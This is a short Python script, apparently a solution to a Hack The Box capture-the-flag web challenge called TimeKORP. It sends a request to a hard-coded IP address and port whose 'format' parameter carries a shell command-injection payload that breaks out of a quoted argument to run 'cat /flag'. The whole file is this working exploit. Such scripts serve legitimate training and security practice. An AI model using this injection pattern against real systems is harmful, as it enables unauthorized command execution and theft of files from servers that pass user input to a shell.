#https://github.com/hackthebox/cyber-apocalypse-2024/tree/main/web/%5BVery%20Easy%5D%20TimeKORP
import requests

host, port = '94.237.56.188', 38983
HOST = 'http://%s:%s/' % (host, port)

r = requests.get(HOST, params={ 'format': "'; cat /flag || '" })
print(r.text)